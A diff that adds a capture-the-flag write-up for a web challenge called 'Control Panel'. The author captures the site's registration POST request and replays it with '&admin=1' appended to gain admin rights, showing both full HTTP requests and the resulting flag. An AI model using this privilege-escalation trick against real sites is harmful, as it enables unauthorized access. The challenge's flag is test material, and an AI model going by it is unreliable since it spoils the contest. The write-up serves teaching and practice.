@@ -1,0 +1,76 @@
+Meta
+-----
+Name: Control Panel
+Score: 40 Points
+Category: Web
+Author: Michael Zhang
+
+Description
+-----
+Take Control... of the flag on this admin control panel (http://cpanel.sctf.michaelz.xyz)
+
+Hint
+-----
+"There are more hints in the comments"
+
+
+Notes
+-----
+
+Visit the site, we are prompted to register a username and password. After logging in successfully, we and get a note in the source code of the http://cpanel.sctf.michaelz.xyz/account page that says
+<!--
+Error: user.admin is not equal to true.
+{
+	"_id": "57088cad6848af0600365259",
+	"username": "dademurphy",
+	"password": "$2a$10$oLylSe.L30GbvVoQXbIF0uuklq2grxdKkZDMLOtPFjsK2nYIFP4N2",
+	"uid": "03c5urkk4ylbr4d4hlvqphxxc"
+}
+-->
+
+This suggests that the user object has an "admin" attribute. Let's see if we can't inject that into the post
+
+Using Fiddler, I grabbed a valid http POST 
+
+POST http://cpanel.sctf.michaelz.xyz/api/user/register HTTP/1.1
+Host: cpanel.sctf.michaelz.xyz
+Connection: keep-alive
+Content-Length: 76
+Accept: */*
+Origin: http://cpanel.sctf.michaelz.xyz
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://cpanel.sctf.michaelz.xyz/register
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: __cfduid=d90024e6a0f0aad8d59f4fa5009f8392c1460171637
+
+_csrf=OQODfV01-1vEZ_xWmYJtXBo5QzrrFGPEjzqQ&username=dademurphy&password=test
+
+
+and used the Composer view to recreate it
+
+POST http://cpanel.sctf.michaelz.xyz/api/user/register HTTP/1.1
+Host: cpanel.sctf.michaelz.xyz
+Connection: keep-alive
+Content-Length: 76
+Accept: */*
+Origin: http://cpanel.sctf.michaelz.xyz
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://cpanel.sctf.michaelz.xyz/register
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: __cfduid=d90024e6a0f0aad8d59f4fa5009f8392c1460171637
+
+_csrf=OQODfV01-1vEZ_xWmYJtXBo5QzrrFGPEjzqQ&username=dademurphy2&password=test&admin=1
+
+But you'll see we've changed the username and at the end we've tacked on "&admin=1"
+
+When we visit the /account page now, instead of telling us that we're not an admin, it gives us the flag:
+
+sctf{TIL_noSql_cAn_bE_InjeKT3d_t0o}
+
+Success!
